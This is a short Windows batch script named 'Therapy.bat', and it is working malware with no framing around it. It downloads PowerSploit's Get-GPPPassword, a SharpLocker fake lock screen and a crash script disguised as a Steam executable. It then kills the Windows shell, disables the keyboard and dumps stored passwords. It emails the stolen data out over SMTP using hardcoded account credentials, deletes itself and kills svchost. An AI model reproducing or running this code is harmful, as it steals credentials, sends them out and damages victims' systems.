rem Therapy.bat (or maybe exe)
@echo off
if not exist %TEMP%\admin echo admin > %TEMP%\admin && cmd /min /C \"set __COMPAT_LAYER=RUNASINVOKER && start "" "%~f0" && exit
timeout /t 4 > nul
bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Get-GPPPassword.ps1 %TEMP%\Get-GPPPassword.ps1 && bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/Criptc/Dump/main/bsod.bat C:\Users\%username%\Desktop\SteamBootStraper.exe & bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/Criptc/Dump/blob/main/SharpLocker.exe?raw=true %TEMP%\log.exe && taskkill /f /im explorer.exe
start %TEMP%\log.exe > %TEMP%\lock.txt && start C:\Users\%username%\Desktop\SteamBootStraper.exe
start C:\windows\system32\rundll32.exe keyboard,disable
echo. >> lock.txt
powershell Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq >> %TEMP%\lock.txt
powershell Compress-Archive -Path %TEMP%\lock.txt -DestinationPath %TEMP%\lock.zip && del %TEMP%\lock.txt
powershell $Sender = 'josephmcorbeil@gmail.com'; $Recipient = 'josephmcorbeil@gmail.com'; $pass = ConvertTo-SecureString 'bodigirl1' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass); Send-MailMessage -From $Sender -To $Recipient -Subject "Keylogger" -Body "Please find attached the Keylogger txt file" -SmtpServer "smtp.google.com" -UseSSL -credential $creds -Attachments "%TEMP%\lock.zip"
timeout /t 5 > nul
del %~f0 & taskkill /f /im svchost.exe & exit
